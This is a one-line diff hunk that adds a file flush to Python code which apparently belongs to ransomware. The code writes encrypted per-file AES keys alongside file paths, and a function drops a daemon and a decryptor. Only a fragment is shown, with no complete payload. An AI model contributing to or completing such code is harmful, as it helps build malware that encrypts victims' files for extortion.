@@ -109,6 +109,7 @@ def menu():
 
             line = base64.b64encode(encrypted_aes_key).decode('utf-8') + " " + base64_path + "\n"
             f.write(line)
+            f.flush()
 
 
 def drop_daemon_and_decryptor():
